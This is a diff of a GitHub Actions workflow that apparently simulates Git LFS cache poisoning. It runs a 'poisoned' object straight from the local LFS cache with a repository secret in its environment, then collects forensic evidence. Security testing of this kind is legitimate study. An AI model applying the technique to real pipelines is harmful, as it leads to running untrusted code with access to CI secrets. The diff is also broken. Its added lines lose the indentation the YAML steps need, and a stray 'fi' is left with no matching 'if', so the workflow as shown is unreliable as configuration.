@@ -105,35 +105,29 @@ jobs:
           INJECTED_SHA=$(sha256sum "$OBJ_PATH" | cut -d' ' -f1)
           echo "Injected payload SHA256: ${INJECTED_SHA:0:16}..."
 
-      - name: Execute Poisoned LFS Object
-        env:
-          AGGRESSIVE_SECRET: ${{ secrets.TEST_SECRET_AGGRESSIVE }}
-        run: |
-          set -euo pipefail
+- name: Execute Poisoned LFS Object
+  env:
+    AGGRESSIVE_SECRET: ${{ secrets.TEST_SECRET_AGGRESSIVE }}
+  run: |
+    set -eo pipefail
 
-          # Find and execute the LFS-tracked script that was replaced in cache
-          LFS_SCRIPT=$(git lfs ls-files --json 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); files=d.get('files',d.get('Files',[])); print(files[0]['name'] if files else '')" || echo "")
+    # Execute the poisoned cache object directly (it IS our payload script)
+    OID="${{ steps.extract-oid.outputs.pointer_oid }}"
+    OBJ_PATH=".git/lfs/objects/${OID:0:2}/${OID:2:2}/$OID"
 
-          if [ -n "$LFS_SCRIPT" ] && [ -f "$LFS_SCRIPT" ]; then
-            bash "$LFS_SCRIPT"
-            EXEC_RC=$?
-            echo "Script executed with exit code: $EXEC_RC"
-          else
-            echo "No LFS script found to execute"
-            # Execute from cache directly as fallback
-            OID="${{ steps.extract-oid.outputs.pointer_oid }}"
-            OBJ_PATH=".git/lfs/objects/${OID:0:2}/${OID:2:2}/$OID"
-            if [ -f "$OBJ_PATH" ]; then
-              AGGRESSIVE_SECRET="${{ secrets.TEST_SECRET_AGGRESSIVE }}"
-              bash "$OBJ_PATH"
-              echo "Executed from cache directly"
-            fi
+    if [ -f "$OBJ_PATH" ]; then
+      AGGRESSIVE_SECRET="${{ secrets.TEST_SECRET_AGGRESSIVE }}" bash "$OBJ_PATH"
+      echo "Executed poisoned cache object (exit code: $?)"
+    else
+      echo "ERROR: Cache object not found at $OBJ_PATH"
+      find .git/lfs/objects -type f 2>/dev/null | sort || true
+    fi
           fi
 
-      - name: Collect Forensic Evidence
-        if: always()
-        run: |
-          set -euo pipefail
+- name: Collect Forensic Evidence
+  if: always()
+  run: |
+    set -eo pipefail
           python3 <<'PYSCRIPT'
           import json, hashlib, os, glob
           from datetime import datetime, timezone
